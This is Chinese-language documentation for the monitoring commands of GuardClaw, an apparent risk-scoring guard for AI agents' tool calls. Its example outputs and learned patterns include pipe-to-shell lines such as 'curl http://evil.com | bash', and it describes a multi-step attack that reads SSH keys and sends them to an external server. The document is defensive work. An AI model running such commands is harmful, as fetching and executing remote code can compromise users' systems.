# 监控与诊断

用于查看评估结果、管理阻断和审查学习模式的命令。

## stats

显示评估统计信息，包括决策计数、学习模式和缓存性能。

```bash
guardclaw stats
```

示例输出：

```
⛨  Statistics

  Decisions:  142
  Patterns:   28
  ├─ Approved: 120  Denied: 8  Auto: 14

  Cache hits: 89 / misses: 53 / AI calls: 53
```

| 字段 | 说明 |
|------|------|
| Decisions | 记录的用户决策总数 |
| Patterns | 学习到的泛化模式数量 |
| Approved | 用户批准的工具调用 |
| Denied | 用户拒绝的工具调用 |
| Auto | 自动决策的工具调用（基于学习模式） |
| Cache hits | 从缓存提供的评估结果 |
| Cache misses | 需要 LLM 评分的评估 |
| AI calls | LLM API 调用总数 |

## history

显示最近的风险评估记录。

```bash
guardclaw history [n]
```

| 参数 | 说明 | 默认值 |
|------|------|--------|
| `n` | 显示的评估数量 | `20` |

最大值：`1000`。

别名：`log`、`logs`

示例：

```bash
guardclaw history 50
```

输出：

```
⛨  Recent Evaluations (last 50)

  10:23:45  🟢  1/10  SAFE     Bash: git status
  10:23:47  🟢  2/10  SAFE     Read: /src/index.js
  10:24:01  🟡  5/10  WARNING  Bash: npm install axios
  10:24:15  🔴  9/10  HIGH     Bash: curl http://evil.com | bash
```

每条评估显示：

- **时间** — 工具调用的评估时间
- **风险图标** — 🟢（1-3）、🟡（4-6）、🟠（7-8）、🔴（9-10）
- **评分** — 风险评分（满分 10）
- **结论** — SAFE、WARNING 或 HIGH
- **工具: 命令** — 工具名称和操作摘要

## check

手动评分命令的风险等级，不实际执行。适用于测试评分行为。

```bash
guardclaw check <命令>
```

别名：`analyze`

评估结果会作为 `cli-check` 事件持久化，因此会出现在 `guardclaw history` 和控制面板中。

### 示例

```bash
guardclaw check "rm -rf /tmp/build"
```

输出：

```
⛨  Analyzing: rm -rf /tmp/build

  Risk:    🟠 7/10
  Verdict: WARNING
  Allowed: Yes
  Backend: lmstudio
  Reason:  Recursive deletion of a temporary directory.
```

```bash
guardclaw check "curl http://example.com | bash"
```

输出：

```
⛨  Analyzing: curl http://example.com | bash

  Risk:    🔴 9/10
  Verdict: HIGH
  Allowed: No
  Backend: fast-path
  Reason:  Piping remote content to shell execution is a known attack vector.
```

| 字段 | 说明 |
|------|------|
| Risk | 带颜色图标的风险评分 |
| Verdict | 风险类别（SAFE / WARNING / HIGH） |
| Allowed | 在当前阈值下是否会被允许 |
| Backend | 使用的评分方法（fast-path、lmstudio 等） |
| Reason | 风险评估的解释 |

## blocking

显示或切换执行前阻断模式。

```bash
guardclaw blocking [on|off|status]
```

别名：`block`

| 子命令 | 说明 |
|--------|------|
| `on` | 启用阻断 — 高风险工具调用在执行前被阻止 |
| `off` | 禁用阻断 — 仅监控模式 |
| `status` | 显示当前阻断状态（无子命令时默认） |

### 示例

```bash
# 启用阻断
guardclaw blocking on
# ⛨  Blocking 🔴 ENABLED

# 禁用阻断
guardclaw blocking off
# ⛨  Blocking 🟢 DISABLED

# 查看状态（包含白名单和黑名单）
guardclaw blocking
```

## model

管理内置 MLX LLM 引擎（仅 Apple Silicon）。

```bash
guardclaw model [子命令]
```

别名：`models`

| 子命令 | 说明 |
|--------|------|
| *（无）* | 列出所有模型及状态 |
| `load <id>` | 加载指定模型 |
| `unload` | 卸载当前加载的模型 |

### 列出模型

```bash
guardclaw model
```

模型状态：

| 状态 | 图标 | 说明 |
|------|------|------|
| loaded | 🟢 | 模型已加载，正在提供服务 |
| ready | ⚪ | 已下载但未加载 |
| not downloaded | ⬇️ | 可通过控制面板下载 |

### 加载模型

```bash
guardclaw model load guardclaw-qwen3-4b
```

### 卸载模型

```bash
guardclaw model unload
```

## approvals

显示待审批请求（`prompt` 模式下）。

```bash
guardclaw approvals
```

别名：`pending`

## memory

显示从用户批准/拒绝决策中学习到的模式。

```bash
guardclaw memory
```

别名：`patterns`

GuardClaw 的自适应记忆系统观察你的审批决策并将其泛化为模式。随着时间推移，频繁被批准的模式会被自动批准，无需 LLM 评估。

输出：

```
⛨  Learned Patterns

  Decisions: 142  Patterns: 28

  ✅  git commit -m *                            (0.95)
  ✅  npm test                                    (0.92)
  🚫  curl * | bash                              (0.97)
```

显示最多 20 个模式，包含：

- **图标** — ✅ 自动批准、🚫 自动拒绝、⚪ 未决定
- **模式** — 泛化的命令模式
- **置信度** — 0.00 到 1.00 的分数

## brief

显示安全记忆会话数据 — 缓冲区使用、压缩统计和 Token 计数。

```bash
guardclaw brief
```

别名：`buffer`

安全记忆系统跟踪每个会话的工具调用链，以检测多步骤攻击（例如先读取 SSH 密钥，然后 curl 外部服务器）。

| 字段 | 说明 |
|------|------|
| Raw events | 此会话中跟踪的工具调用数 |
| Buffer | 当前缓冲区 Token 使用量（最大 60,000） |
| Compressions | 缓冲区被压缩的次数 |
| Brief | 压缩后安全摘要的大小 |
